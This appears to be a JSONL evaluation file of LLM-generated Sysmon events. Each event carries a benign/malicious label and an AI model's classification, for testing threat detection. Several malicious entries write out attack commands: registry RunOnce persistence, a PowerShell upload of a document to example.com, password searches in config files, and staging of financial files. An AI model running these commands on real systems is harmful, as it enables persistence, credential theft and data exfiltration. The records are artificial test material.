{"EventID": 1, "EventTime": "2020-05-01 22:56:40", "UtcTime": "2020-05-01T22:56:40.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v WinUpdate /t REG_SZ /d \"cmd.exe /c C:\\ProgramData\\update.bat\"", "ProcessId": "1267", "ProcessGUID": "{6bbf237a-04f3-5eac-04f3-0000000004f3}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "persistence", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:40] | PID=1267 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v WinUpdate /t REG_SZ /d \"cmd.exe /c C:\\ProgramData\\update.bat\"", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Registry modification adding a RunOnce entry to execute a batch file from ProgramData at next boot - classic persistence mechanism using an unusual location for legitimate updates.", "confidence": "high", "attack_technique": "persistence"}}
{"EventID": 15, "EventTime": "2025-11-06 18:11:10", "UtcTime": "2025-11-06T18:11:10.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "10123", "ProcessGUID": "{a127ef01-7134-a16c-3d4f-db55adad3999}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "Image": "C:\\Program Files\\Microsoft VS Code\\Code.exe", "TargetFilename": "C:\\Users\\jsmith\\Documents\\GitHub\\my-project\\.git\\index", "CreationUtcTime": "2025-11-06T18:11:10.000Z", "_label": "benign", "_source": "llm", "prompt": "[2025-11-06 18:11:10] | PID=10123 | User=CORP\\jsmith | Image=C:\\Program Files\\Microsoft VS Code\\Code.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Visual Studio Code (VS Code) running from its standard installation directory under a corporate user account - normal development/editing activity.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-15 08:22:15", "UtcTime": "2025-10-15T08:22:15.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\WindowsApps\\Microsoft.Photos_2024.11050.25004.0_x64__8wekyb3d8bbwe\\Microsoft.Photos.exe", "CommandLine": "\"C:\\Program Files\\WindowsApps\\Microsoft.Photos_2024.11050.25004.0_x64__8wekyb3d8bbwe\\Microsoft.Photos.exe\" -ServerName:Microsoft.Photos.AppXm76tvw7p5y8cf38af642899rtfn3c5.mca", "ProcessId": "2345", "ProcessGUID": "{234f5678-f90c-23e4-b567-537725285111}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{123e4567-e89b-12d3-a456-426614174000}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\Pictures", "LogonId": "0x12345", "_label": "benign", "_source": "llm", "prompt": "[2025-10-15 08:22:15] | PID=2345 | User=CORP\\jsmith | Image=C:\\Program Files\\WindowsApps\\Microsoft.Photos_2024.11050.25004.0_x64__8wekyb3d8bbwe\\Microsoft.Photos.exe | Parent=C:\\Windows\\explorer.exe | CMD=\"C:\\Program Files\\WindowsApps\\Microsoft.Photos_2024.11050.25004.0_x64__8wekyb3d8bbwe\\Microsoft.Photos.exe\" -ServerName:Microsoft.Photos.AppXm76tvw7p5y8cf38af642899rtfn3c5.mca", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Microsoft Photos application launched by Windows Explorer with standard AppX parameters - normal user activity for viewing photos.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:38", "UtcTime": "2020-05-01T22:57:38.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell -c (New-Object Net.WebClient).UploadFile(\"http://example.com/upload/report.docx\", \"C:\\Users\\Public\\Documents\\report.docx\")", "ProcessId": "1945", "ProcessGUID": "{6bbf237a-0799-5eac-0799-000000000799}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1789", "ParentProcessGUID": "{6bbf237a-06fd-5eac-06fd-0000000006fd}", "ParentCommandLine": "cmd.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\NETWORK SERVICE\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:38] | PID=1945 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=powershell -c (New-Object Net.WebClient).UploadFile(\"http://example.com/upload/report.docx\", \"C:\\Users\\Public\\Documents\\report.docx\")", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "PowerShell WebClient uploading file from C:\\Users\\Public\\Documents to external server - classic data exfiltration pattern using living-off-the-land technique.", "confidence": "high", "attack_technique": "file_exfiltration"}}
{"EventID": 1, "EventTime": "2025-10-10 08:00:00", "UtcTime": "2025-10-10T08:00:00.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c echo Hello World", "ProcessId": "4512", "ProcessGUID": "{6bbf237a-cafb-5eac-1000-000000000400}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb248b-dbdc-5ead-1000-000000000500}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:00:00] | PID=4512 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c echo Hello World", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User executing a simple echo command via cmd.exe spawned from explorer.exe - standard user activity with no malicious indicators.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-09 15:36:25", "UtcTime": "2025-10-09T15:36:25.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" C:\\Users\\jsmith\\Documents\\report.docx", "ProcessId": "7845", "ProcessGUID": "{6bbf237a-cafb-5eac-1000-000000000404}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb237a-cafb-5eac-1000-000000000401}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-09 15:36:25] | PID=7845 | User=CORP\\jsmith | Image=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE | Parent=C:\\Windows\\explorer.exe | CMD=\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" C:\\Users\\jsmith\\Documents\\report.docx", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User opening a Word document from their Documents folder via Windows Explorer - standard office productivity activity with expected parent-child process relationship.", "confidence": "high", "attack_technique": ""}}
{"EventID": 3, "EventTime": "2025-10-10 08:04:20", "UtcTime": "2025-10-10T08:04:20.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Mozilla Firefox\\firefox.exe", "ProcessId": "12345", "ProcessGUID": "{78aa12e0-2ed2-5ec0-1000-000000001700}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "SourcePort": "54326", "DestinationIp": "34.107.221.82", "DestinationPort": "443", "DestinationHostname": "addons.mozilla.org", "Protocol": "TCP", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:04:20] | PID=12345 | User=CORP\\jsmith | Image=C:\\Program Files\\Mozilla Firefox\\firefox.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Firefox browser process running from legitimate installation directory under standard user context - normal application usage.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-09 15:36:35", "UtcTime": "2025-10-09T15:36:35.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\regedit.exe", "CommandLine": "regedit.exe", "ProcessId": "8956", "ProcessGUID": "{6bbf237a-cafb-5eac-1000-000000000405}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb237a-cafb-5eac-1000-000000000401}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-09 15:36:35] | PID=8956 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\regedit.exe | Parent=C:\\Windows\\explorer.exe | CMD=regedit.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User jsmith launched Registry Editor (regedit.exe) from Windows Explorer through normal GUI interaction - standard administrative task with legitimate parent process.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:45", "UtcTime": "2020-05-01T22:56:45.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c findstr /si password C:\\Users\\Public\\Documents\\*.xml C:\\ProgramData\\*.config", "ProcessId": "1256", "ProcessGUID": "{6bbf237a-04e8-5eac-04e8-0000000004e8}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:45] | PID=1256 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c findstr /si password C:\\Users\\Public\\Documents\\*.xml C:\\ProgramData\\*.config", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Command searches for passwords in XML and config files across multiple directories using findstr - classic credential discovery pattern. Additionally, the NETWORK SERVICE account spawning cmd.exe from explorer.exe is an unusual parent-child relationship indicating potential privilege abuse.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:10", "UtcTime": "2020-05-01T22:56:10.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "ProcessId": "1256", "ProcessGUID": "{6bbf237a-04e8-5eac-04e8-0000000004e8}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1245", "ParentProcessGUID": "{6bbf237a-04dd-5eac-04dd-0000000004dd}", "ParentCommandLine": "cmd.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\pbeesly\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:10] | PID=1256 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\reg.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Querying the Winlogon registry key is commonly used for credential discovery to find default usernames, passwords, or autologon credentials stored in the registry.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2025-11-01 10:01:15", "UtcTime": "2025-11-01T10:01:15.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Mozilla Firefox\\firefox.exe", "CommandLine": "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"", "ProcessId": "6789", "ProcessGUID": "{67839abc-3def-6728-f90b-9711696c9555}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{123e4567-e89b-12d3-a456-426614174000}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Program Files\\Mozilla Firefox", "LogonId": "0x12345", "_label": "benign", "_source": "llm", "prompt": "[2025-11-01 10:01:15] | PID=6789 | User=CORP\\jsmith | Image=C:\\Program Files\\Mozilla Firefox\\firefox.exe | Parent=C:\\Windows\\explorer.exe | CMD=\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Firefox browser launched by Windows Explorer under normal user context - standard application startup activity.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:05", "UtcTime": "2020-05-01T22:57:05.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\makecab.exe", "CommandLine": "makecab C:\\Users\\pbeesly\\Documents\\FinancialReports.xlsx C:\\ProgramData\\Microsoft\\Windows\\UpdateCache\\Reports.cab", "ProcessId": "1267", "ProcessGUID": "{6bbf237a-04f3-5eac-04f3-0000000004f3}", "ParentImage": "C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr", "ParentProcessId": "789", "ParentProcessGUID": "{6bbf237a-0315-5eac-0315-000000000315}", "ParentCommandLine": "C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_staging", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:05] | PID=1267 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\makecab.exe | Parent=C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr | CMD=makecab C:\\Users\\pbeesly\\Documents\\FinancialReports.xlsx C:\\ProgramData\\Microsoft\\Windows\\UpdateCache\\Reports.cab", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Makecab.exe compressing sensitive financial documents to an unusual staging location (UpdateCache) with suspicious parent process using right-to-left override character in filename - classic data staging for exfiltration.", "confidence": "high", "attack_technique": "data_staging"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:25", "UtcTime": "2020-05-01T22:56:25.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c bitsadmin /transfer job1 /create", "ProcessId": "3112", "ProcessGUID": "{6bbf237a-0c28-5eac-0c28-000000000c28}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "4328", "ParentProcessGUID": "{6bbf237a-10e8-5eac-10e8-0000000010e8}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:25] | PID=3112 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c bitsadmin /transfer job1 /create", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "SYSTEM account using cmd.exe spawned from explorer.exe to execute bitsadmin for file transfer - unusual parent-child relationship and potential abuse of BITS for download/command-and-control activity.", "confidence": "high", "attack_technique": "command_and_control"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:50", "UtcTime": "2020-05-01T22:56:50.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\icacls.exe", "CommandLine": "icacls C:\\Users\\Default\\AppData\\Local\\Microsoft\\Windows\\INetCache /reset /t", "ProcessId": "1267", "ProcessGUID": "{6bbf237a-04f3-5eac-04f3-0000000004f3}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1245", "ParentProcessGUID": "{6bbf237a-04dd-5eac-04dd-0000000004dd}", "ParentCommandLine": "cmd.exe /c icacls C:\\Users\\Default\\AppData\\Local\\Microsoft\\Windows\\INetCache /reset /t", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\NETWORK SERVICE\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "permission_manipulation", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:50] | PID=1267 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\icacls.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=icacls C:\\Users\\Default\\AppData\\Local\\Microsoft\\Windows\\INetCache /reset /t", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "NETWORK SERVICE account using icacls to reset permissions on INetCache directory is consistent with legitimate Windows system maintenance or repair operations for Internet Explorer cache.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:45", "UtcTime": "2020-05-01T22:56:45.000Z", "Hostname": "NASHUA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell Get-SmbShare", "ProcessId": "1688", "ProcessGUID": "{6bbf237a-0698-5eac-0698-000000000698}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "4312", "ParentProcessGUID": "{6bbf237a-10d8-5eac-10d8-0000000010d8}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "share_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:45] | PID=1688 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Parent=C:\\Windows\\explorer.exe | CMD=powershell Get-SmbShare", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "PowerShell command Get-SmbShare is used to enumerate network shares on the system, which is a common reconnaissance technique for discovering shared resources before lateral movement or data exfiltration.", "confidence": "medium", "attack_technique": "network_enumeration"}}
{"EventID": 11, "EventTime": "2025-10-10 08:00:20", "UtcTime": "2025-10-10T08:00:20.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "6789", "ProcessGUID": "{9deb46ad-2c3e-71df-1300-000000000700}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "Image": "C:\\Program Files\\Notepad++\\notepad++.exe", "TargetFilename": "C:\\Users\\jsmith\\Documents\\new_file.txt", "CreationUtcTime": "2025-10-10T08:00:20.000Z", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:00:20] | PID=6789 | User=CORP\\jsmith | Image=C:\\Program Files\\Notepad++\\notepad++.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Notepad++ text editor launched by a domain user - standard legitimate application usage with no suspicious command-line arguments or context.", "confidence": "high", "attack_technique": ""}}
